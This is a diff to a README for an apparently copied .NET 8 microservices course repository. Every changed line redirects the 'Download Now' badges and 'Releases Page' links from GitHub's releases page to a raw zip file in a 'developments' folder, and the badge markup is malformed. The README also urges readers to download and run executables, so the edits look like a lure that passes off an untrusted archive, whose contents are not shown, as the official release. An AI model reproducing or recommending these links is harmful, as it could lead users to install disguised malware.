@@ -1,6 +1,6 @@
 # 🌟 dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12 - Learn Microservices with Ease
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-blue.svg)](https://github.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/releases)
+[![Download Now!](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip%20Now!https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip)](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the **dotnet-expert-1_0_immersion-architecture-microservices_course-l
 
 To begin using this software, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip).
 2. Look for the latest version marked as “Latest Release”.
 3. Click on the version link to view available downloads.
 4. Download the appropriate file for your system. The options may include executables for Windows, Mac, or packages for Linux.
@@ -28,7 +28,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 To download the software:
 
-1. Visit the [Releases Page](https://github.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip).
 2. Select the file for your operating system.
 3. Click on the file to begin the download.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -67,4 +67,4 @@ For additional help or to ask questions, please check the issues section of the 
 
 Thanks to all contributors who have helped make this project useful for learning microservices architecture. Their hard work and dedication are greatly appreciated.
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-blue.svg)](https://github.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/releases)
+[![Download Now!](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip%20Now!https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip)](https://raw.githubusercontent.com/pswadhekar12/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/dotnet-expert-1_0_immersion-architecture-microservices_course-luisdev-part-1_dotnet-8_csharp-12-v2.6.zip)
